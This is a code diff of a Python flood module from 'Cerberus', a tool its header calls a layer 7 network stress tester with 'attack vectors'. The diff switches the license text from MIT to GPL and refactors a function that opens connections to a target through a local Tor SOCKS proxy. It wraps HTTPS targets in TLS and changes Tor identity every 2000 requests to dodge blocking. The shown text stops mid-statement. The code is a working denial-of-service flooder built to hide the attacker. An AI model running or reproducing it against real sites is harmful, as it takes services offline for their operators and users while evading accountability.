@@ -1,45 +1,32 @@
 '''
 
-Copyright (c) 2022 Nexus/Nexuzzzz
+Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
+Copyright (C) 2022  Nexus/Nexuzzzz
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 '''
 
 import time, ssl
+
 from python_socks.sync import Proxy
 from random import uniform
 from urllib.parse import urlparse
-from stem import Signal
-from stem.control import Controller
+
 from src.core import Core
 from src.utils import *
 from src.useragent import *
-
-def new_identity() -> None:
-    '''
-    Changes the current TOR circuit, and changes the exit node with that too
-    '''
-
-    with Controller.from_port(port=9052) as controller:
-        controller.authenticate(password='cerberus')
-        controller.signal(Signal.NEWNYM)
 
 def flood(attack_id, url, stoptime) -> None:
 
@@ -50,23 +37,24 @@ def flood(attack_id, url, stoptime) -> None:
         utils().launch_tor()
 
     socket = None
+
+    try: proxy = Proxy.from_url('socks5://127.0.0.1:9049') # set the proxy to the port in "src/files/Tor/torrc"
+    except Exception:
+        utils().launch_tor() # launch tor
+
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
             continue
         
         if Core.change_identity >= 2000: # if the counter reaches 2000, we change the TOR identity/circuit
             Core.change_identity = 0 # reset
-            new_identity()
+            utils().new_identity()
             Core.infodict[attack_id]['identities_changed'] += 1
 
         try:
 
-            if not socket:
-                try:
-                    proxy = Proxy.from_url('socks5://127.0.0.1:9049') # set the proxy to the port in "src/files/Tor/torrc"
-                    socket = proxy.connect(Core.target_host, Core.target_port) # connect
-                except Exception:
-                    utils().launch_tor() # launch tor
+            if not socket: # if the socket has not been defined yet, we create a new socket and wrap it with the TOR proxy
+                socket = proxy.connect(Core.target_host, Core.target_port) # connect
 
                 if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
                     socket = ssl.create_default_context().wrap_socket(
